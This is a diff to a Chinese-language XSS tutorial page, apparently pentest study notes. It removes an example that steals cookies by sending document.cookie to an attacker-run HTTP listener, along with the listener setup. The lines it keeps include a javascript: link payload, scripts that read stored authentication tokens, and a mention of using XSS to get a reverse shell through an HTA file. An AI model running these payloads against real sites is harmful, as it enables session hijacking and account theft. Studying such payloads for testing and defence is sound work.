@@ -254,13 +254,6 @@ POC：
 - 在href属性中注入链接或者其他事件，使用户在点击的时候触发：`<a href="javascript:alert('xss')">点击我</a>`
 
 !!! example "示例"
-    - 利用XSS获取cookie：启动一个服务器接收请求，利用XSS发送请求`<script>document.write('<img src="http://192.168.56.10:88/'+document.cookie+'">');</script>`，获取受害者cookie。
-
-    !!! warning "前提"
-        1. cookie没有开启httponly
-        1. 启动一个http服务器：`python -m SimpleHTTPServer 88`
-        1. 有用户交互
-
     - 利用XSS获取HTML5本地存储`<script>alert(window.localStorage.MessageOfTheDay);</script>`或会话存储`<script>alert(window.sessionStorage.getItem("Secure.AuthenticationToken"));</script>`
     - 利用XSS诱骗受害者下载运行HTA获取反弹shell
 
